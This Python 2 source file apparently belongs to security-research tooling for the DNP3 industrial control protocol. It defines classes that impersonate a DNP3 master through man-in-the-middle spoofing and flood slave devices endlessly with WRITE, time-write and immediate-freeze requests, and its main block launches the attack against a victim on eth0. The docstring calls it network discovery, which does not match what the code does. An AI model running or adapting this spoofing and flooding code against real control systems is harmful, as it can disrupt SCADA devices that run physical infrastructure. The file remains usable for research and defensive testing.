__author__ = 'Nicholas Rodofile'
from DNP3_Master import *

class DNP3_Master_flooding(Master):
    def __init__(self, node, port, timeout_time=2*60):
        Master.__init__(self, node, port, timeout_time)


    def flooder(self):
        # while not self.enable_config_slave and self.running:
        #self.discovery_frame()
        #    pass
        while self.running:
            msg = self.node.spoofer.masquerade([appFuncCode["WRITE"], 'write_IIN'])
            self.queue_out.put(msg)

    def automation(self):
        while not self.running:
            pass
        if self.running:
            print "flooding"
            self.flooder()
        else:
            print "fail flooding"

class DNP3_Master_flooding_time(DNP3_Master_flooding):
    def flooder(self):
        sleep(3)
        msg = self.node.spoofer.masquerade([appFuncCode["RECORD_CURRENT_TIME"], None])
        sleep(2)
        self.queue_out.put(msg)
        while self.running:
            msg = self.node.spoofer.masquerade([appFuncCode["WRITE"], 'write_time'])
            self.queue_out.put(msg)


class DNP3_Master_flooding_Freeze(DNP3_Master_flooding):
    def flooder(self):
        while self.running:
            msg = self.node.spoofer.masquerade([appFuncCode["IMMED_FREEZE"], 'binary_counter_default_variation'])
            self.queue_out.put(msg)

if __name__ == '__main__':
    """
    This Script is used to perform network discovery on DNP3 slaves
    """

    DNP3_nodes_found = []
    mitm = DNP3_MITM_conf(interface='eth0')
    mitm.init_spoofing()
    victim = mitm.victim
    master = DNP3_Master_flooding(victim, dnp3_port)
    DNP = master.start()